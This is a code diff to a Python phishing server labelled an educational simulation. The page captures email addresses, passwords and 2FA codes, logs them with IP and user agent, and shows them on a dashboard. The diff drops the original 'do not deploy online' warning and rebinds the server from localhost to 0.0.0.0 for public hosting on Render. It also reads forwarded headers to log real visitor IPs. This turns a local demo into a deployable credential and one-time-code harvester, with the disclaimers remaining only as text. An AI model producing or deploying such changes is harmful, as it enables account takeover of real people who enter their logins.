@@ -1,6 +1,10 @@
+
+
+
+
 #!/usr/bin/env python3
-# ADVANCED EDUCATIONAL PHISHING SIMULATION - Local Only
-# DO NOT deploy online or use on others
+# ADVANCED EDUCATIONAL PHISHING SIMULATION - Educational Purposes Only
+# WARNING: Only deploy in controlled environments with explicit consent
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import urllib.parse
@@ -89,8 +93,9 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
                 </div>
                 
                 <div class="card warning">
-                    <h2>Dashboard</h2>
-                    <p>This dashboard shows captured credentials.</p>
+                    <h2>⚠️ EDUCATIONAL USE ONLY</h2>
+                    <p>This dashboard shows captured credentials for security awareness training.</p>
+                    <p><strong>All data is stored locally and will be lost when the server restarts.</strong></p>
                     <form action="/clear_logs" method="POST">
                         <button type="submit" onclick="return confirm('Clear all logs?')"> Clear All Logs </button>
                     </form>
@@ -165,14 +170,17 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             totp = parsed_data.get('totp', [''])[0]
             
             # Get client info
-            client_ip = self.client_address[0]
+            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+            if client_ip and ',' in client_ip:
+                client_ip = client_ip.split(',')[0].strip()
+            
             user_agent = self.headers.get('User-Agent', 'Unknown')
             
             # Create timestamp
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             
             # Log to simple text file
-            log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | 2FA: {totp}\n"
+            log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | 2FA: {totp} | UA: {user_agent[:50]}\n"
             with open('captured_log.txt', 'a') as f:
                 f.write(log_entry)
             
@@ -183,7 +191,8 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
                 'email': email,
                 'password': password,
                 'totp': totp if totp else None,
-                'user_agent': user_agent
+                'user_agent': user_agent,
+                'attack_phase': 'initial'
             }
             
             if os.path.exists('detailed_log.json'):
@@ -197,7 +206,7 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             with open('detailed_log.json', 'w') as f:
                 json.dump(logs, f, indent=2)
             
-            # Terminal output
+            # Console output (will appear in Render logs)
             print("\n" + "="*50)
             print("[!] CREDENTIALS CAPTURED -", timestamp)
             print("="*50)
@@ -207,8 +216,6 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
                 print("2FA Code: ", totp)
             print("IP:       ", client_ip)
             print("="*50)
-            print("Saved to: captured_log.txt")
-            print("="*50 + "\n")
             
             # Send response - redirect to error page
             self.send_response(302)
@@ -223,31 +230,39 @@ class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
             self.end_headers()
     
     def log_message(self, format, *args):
-        """Suppress default HTTP logs"""
-        pass
+        """Custom log formatting for Render"""
+        # Only log important messages
+        if args[0] not in ['GET', 'POST']:
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {args[0]} {args[1]}")
 
-def run_server(port=5000):
-    server_address = ('127.0.0.1', port)
+def run_server():
+    """Run server on all interfaces for Render deployment"""
+    # Get port from environment variable (Render sets this)
+    port = int(os.environ.get('PORT', 5000))
+    # Bind to all interfaces (0.0.0.0) instead of localhost
+    server_address = ('0.0.0.0', port)
     httpd = HTTPServer(server_address, AdvancedPhishingSimHandler)
     
     print("\n" + "="*50)
-    print("Phishing Simulation (Educational)")
+    print("🔐 Phishing Simulation (Educational)")
     print("="*50)
-    print("Server running at: http://127.0.0.1:" + str(port))
-    print("\nFeatures:")
-    print("  - Email + Password + 2FA capture")
-    print("  - Admin dashboard")
-    print("  - Statistics tracking")
-    print("\nTest it:")
-    print("  1. Open browser to http://127.0.0.1:5000")
-    print("  2. Enter fake credentials")
-    print("  3. Check dashboard at /dashboard")
+    print(f"✅ Server running on port {port}")
+    print(f"🌐 Accessible at: https://your-render-url.onrender.com")
+    print("\n⚠️  IMPORTANT SECURITY NOTES:")
+    print("   - This is for EDUCATIONAL PURPOSES only")
+    print("   - Only use with explicit participant consent")
+    print("   - All captured data is stored locally")
+    print("   - Data will be lost on server restart")
+    print("\n📊 Endpoints:")
+    print("   - Main page: /")
+    print("   - Dashboard: /dashboard")
+    print("   - Statistics: /stats")
     print("\nPress Ctrl+C to stop\n")
     
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:
-        print("\nShutting down...")
+        print("\n🛑 Shutting down...")
         httpd.server_close()
 
 if __name__ == '__main__':
